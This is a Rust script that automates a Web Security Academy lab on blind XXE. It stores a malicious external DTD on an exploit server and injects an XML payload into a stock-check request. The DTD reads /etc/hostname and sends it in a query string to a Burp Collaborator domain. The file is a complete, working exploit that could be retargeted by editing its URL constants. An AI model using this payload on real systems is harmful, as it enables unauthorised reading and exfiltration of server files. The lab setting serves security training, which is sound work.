/********************************************************************************
*
* Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
*
* Hack Steps:
*      1. Store the malicious DTD file in your exploit server
*      2. Inject payload into the XML-based check stock request to exfiltrate
*         the hostname using an external DTD
*      3. Check your burp collaborator for the hostname in the HTTP request
*         query parameter
*      4. Submit the solution
*
*********************************************************************************/
use lazy_static::lazy_static;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0abc007c048042d580c2da500007003a.web-security-academy.net"; // Change this to your lab URL
const BURP_COLLABORATOR: &str = "suqxqekiuohqxjjfanrc03z37udl1bp0.oastify.com"; // Change this to your burp collaborator domain
const EXPLOIT_SERVER_ULR: &str =
    "https://exploit-0ab30053042d427680bbd9ad019f00cc.exploit-server.net"; // Change this to your exploit server URL

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!("â¦—#â¦˜ Injection point: {}", "Check stock request".yellow());
    print!("â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. ");
    io::stdout().flush().unwrap();

    let malicious_file_name = "exploit.dtd"; // You can change this to what you want
    let malicious_file = format!(
        r###"<!ENTITY % file SYSTEM "file:///etc/hostname">
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://{BURP_COLLABORATOR}/?hostname=%file;'>">
        %eval;
        %exfiltrate;"###
    );
    store_file_on_exploit_server(malicious_file_name, &malicious_file);

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Using the external DTD to exfiltrate the hostname.. ");
    io::stdout().flush().unwrap();

    let payload = format!(
        r###"<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{EXPLOIT_SERVER_ULR}/{malicious_file_name}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>
            </stockCheck>"###
    );
    check_stock_with_payload(payload);

    println!("{}", "OK".green());
    println!("ðŸ—¹ Check your burp collaborator for the hostname in the HTTP request query parameter then sumbit the solution");
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn check_stock_with_payload(payload: String) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to fetch the page with the injected payload".red()
        ))
}

fn store_file_on_exploit_server(file_name: &str, file: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8";

    WEB_CLIENT
        .post(EXPLOIT_SERVER_ULR)
        .form(&HashMap::from([
            ("formAction", "STORE"),
            ("urlIsHttps", "on"),
            ("responseFile", &format!("/{file_name}")),
            ("responseHead", response_head),
            ("responseBody", file),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to store the malicious DTD file on your exploit server".red()
        ));
}
